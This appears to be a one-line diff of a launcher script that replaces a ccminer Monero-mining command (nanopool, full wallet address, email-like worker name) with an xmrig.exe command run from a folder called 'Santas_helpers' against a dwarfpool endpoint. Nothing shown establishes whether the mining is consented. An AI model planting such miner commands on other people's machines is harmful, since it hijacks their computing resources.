@@ -1,1 +1,1 @@
-ccminer -o ssl://xmr-eu1.nanopool.org:14433 -u 42gsJzs4LG6RtKtJBhTM1jEzTGBKDBupgPpUSEHmtveLVUAEhgVcqDDZjGxuAQJSmpEMYBCKBhFrf7kvGu48utTjCH65GhN.parth/aguy@gmail.com -p x -t 1 
+Santas_helpers\xmrig.exe -o xmr-eu.dwarfpool.com:8005 -u 12 -p x -k
